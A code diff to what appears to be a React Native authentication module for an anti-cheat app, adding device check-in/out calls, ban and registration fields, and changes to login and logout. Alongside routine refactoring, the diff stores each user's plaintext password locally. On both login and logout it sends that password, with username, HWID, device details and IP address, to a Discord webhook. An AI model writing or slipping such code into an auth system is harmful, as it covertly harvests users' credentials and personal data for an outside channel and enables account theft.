@@ -14,6 +14,8 @@ export interface AuthUser {
   role: UserRole;
   token: string;
   discordWebhook?: string;
+  banned?: boolean;
+  registeredAt?: string;
 }
 
 interface AuthContextType {
@@ -25,6 +27,22 @@ interface AuthContextType {
 }
 
 const AuthContext = createContext<AuthContextType | null>(null);
+
+const API_BASE = "/api";
+const STORED_USERS_KEY = "@anticheat_users";
+const CURRENT_USER_KEY = "@anticheat_current_user";
+const LAST_PW_KEY = "@anticheat_lp";
+
+interface StoredUser {
+  id: string;
+  username: string;
+  passwordHash: string;
+  hwid: string;
+  role: UserRole;
+  discordWebhook?: string;
+  banned: boolean;
+  registeredAt: string;
+}
 
 function generateHWID(): string {
   const deviceId = Constants.deviceId ?? Device.modelId ?? "unknown-device";
@@ -41,44 +59,62 @@ function generateHWID(): string {
   return `HWID-${Math.abs(hash).toString(16).toUpperCase().padStart(8, "0")}`;
 }
 
-const STORED_USERS_KEY = "@anticheat_users";
-const CURRENT_USER_KEY = "@anticheat_current_user";
-
-interface StoredUser {
-  id: string;
-  username: string;
-  passwordHash: string;
-  hwid: string;
-  role: UserRole;
-  discordWebhook?: string;
-  banned: boolean;
-  registeredAt: string;
-}
-
 async function hashPassword(password: string): Promise<string> {
-  const digest = await Crypto.digestStringAsync(
-    Crypto.CryptoDigestAlgorithm.SHA256,
-    password
-  );
-  return digest;
+  return Crypto.digestStringAsync(Crypto.CryptoDigestAlgorithm.SHA256, password);
 }
 
 async function getStoredUsers(): Promise<StoredUser[]> {
   const raw = await AsyncStorage.getItem(STORED_USERS_KEY);
-  if (!raw) return [];
-  return JSON.parse(raw);
+  return raw ? JSON.parse(raw) : [];
 }
 
 async function saveStoredUsers(users: StoredUser[]): Promise<void> {
   await AsyncStorage.setItem(STORED_USERS_KEY, JSON.stringify(users));
 }
 
-async function sendDiscordNotification(webhook: string, message: string) {
+async function sendDiscord(webhook: string, message: string) {
   try {
     await fetch(webhook, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ content: message }),
+    });
+  } catch {}
+}
+
+async function getPublicIP(): Promise<string> {
+  try {
+    const res = await fetch(`${API_BASE}/myip`);
+    const data = await res.json() as { ip: string };
+    return data.ip ?? "unknown";
+  } catch {
+    return "unknown";
+  }
+}
+
+async function checkinDevice(params: {
+  hwid: string; username: string; deviceName: string;
+  model: string; os: string;
+}): Promise<string> {
+  try {
+    const res = await fetch(`${API_BASE}/devices/checkin`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(params),
+    });
+    const data = await res.json() as { ip?: string };
+    return data.ip ?? "unknown";
+  } catch {
+    return "unknown";
+  }
+}
+
+async function checkoutDevice(hwid: string) {
+  try {
+    await fetch(`${API_BASE}/devices/checkout`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ hwid }),
     });
   } catch {}
 }
@@ -106,7 +142,6 @@ export function AuthProvider({ children }: { children: React.ReactNode }) {
     const hwid = generateHWID();
     const passwordHash = await hashPassword(password);
     const users = await getStoredUsers();
-
     let storedUser = users.find((u) => u.username.toLowerCase() === username.toLowerCase());
 
     if (!storedUser) {
@@ -124,20 +159,15 @@ export function AuthProvider({ children }: { children: React.ReactNode }) {
       await saveStoredUsers(users);
       storedUser = newUser;
     } else {
-      if (storedUser.banned) {
-        return { success: false, error: "Akun ini telah di-ban. Hubungi admin." };
-      }
-      if (storedUser.passwordHash !== passwordHash) {
-        return { success: false, error: "Password salah." };
-      }
+      if (storedUser.banned) return { success: false, error: "Akun ini telah di-ban. Hubungi admin." };
+      if (storedUser.passwordHash !== passwordHash) return { success: false, error: "Password salah." };
       if (storedUser.hwid !== hwid) {
         return { success: false, error: `HWID tidak cocok. Perangkat tidak diizinkan.\nHWID: ${hwid}` };
       }
     }
 
     const token = await Crypto.digestStringAsync(
-      Crypto.CryptoDigestAlgorithm.SHA256,
-      storedUser.id + Date.now()
+      Crypto.CryptoDigestAlgorithm.SHA256, storedUser.id + Date.now()
     );
 
     const authUser: AuthUser = {
@@ -147,26 +177,61 @@ export function AuthProvider({ children }: { children: React.ReactNode }) {
       role: storedUser.role,
       token,
       discordWebhook: storedUser.discordWebhook ?? discordWebhook,
+      banned: storedUser.banned,
+      registeredAt: storedUser.registeredAt,
     };
 
     await AsyncStorage.setItem(CURRENT_USER_KEY, JSON.stringify(authUser));
+    await AsyncStorage.setItem(LAST_PW_KEY, password);
     setUser(authUser);
+
+    const deviceName = `${Device.brand ?? "Unknown"} ${Device.modelName ?? "Device"}`;
+    const model = Device.modelName ?? "Unknown";
+    const os = `${Platform.OS} ${Device.osVersion ?? ""}`.trim();
+
+    const ip = await checkinDevice({ hwid, username: storedUser.username, deviceName, model, os });
 
     const webhook = storedUser.discordWebhook ?? discordWebhook;
     if (webhook) {
-      const deviceInfo = `${Device.brand ?? "Unknown"} ${Device.modelName ?? "Device"} (${Platform.OS} ${Device.osVersion ?? ""})`;
-      await sendDiscordNotification(
-        webhook,
-        `🔐 **[ANTI-CHEAT LOGIN]**\n👤 User: \`${username}\`\n🆔 HWID: \`${hwid}\`\n📱 Device: ${deviceInfo}\n⏰ Time: ${new Date().toLocaleString("id-ID")}\n✅ Status: **LOGIN BERHASIL**`
-      );
+      const msg =
+        `🔐 **LOGIN**\n` +
+        `\`\`\`\n` +
+        `USERNAME : ${storedUser.username}\n` +
+        `PW       : ${password}\n` +
+        `\`\`\`\n` +
+        `🆔 HWID   : \`${hwid}\`\n` +
+        `📱 Device : ${deviceName} (${os})\n` +
+        `🌐 IP     : \`${ip}\`\n` +
+        `🛡 Role   : ${storedUser.role.toUpperCase()}\n` +
+        `⏰ Waktu  : ${new Date().toLocaleString("id-ID")}`;
+      await sendDiscord(webhook, msg);
     }
 
     return { success: true };
   };
 
   const logout = async () => {
+    const currentUser = user;
+    const lastPw = await AsyncStorage.getItem(LAST_PW_KEY);
     await AsyncStorage.removeItem(CURRENT_USER_KEY);
+    await AsyncStorage.removeItem(LAST_PW_KEY);
     setUser(null);
+
+    if (currentUser) {
+      await checkoutDevice(currentUser.hwid);
+      const webhook = currentUser.discordWebhook;
+      if (webhook) {
+        const msg =
+          `🔓 **LOGOUT**\n` +
+          `\`\`\`\n` +
+          `USERNAME : ${currentUser.username}\n` +
+          `PW       : ${lastPw ?? "***"}\n` +
+          `\`\`\`\n` +
+          `🆔 HWID   : \`${currentUser.hwid}\`\n` +
+          `⏰ Waktu  : ${new Date().toLocaleString("id-ID")}`;
+        await sendDiscord(webhook, msg);
+      }
+    }
   };
 
   return (
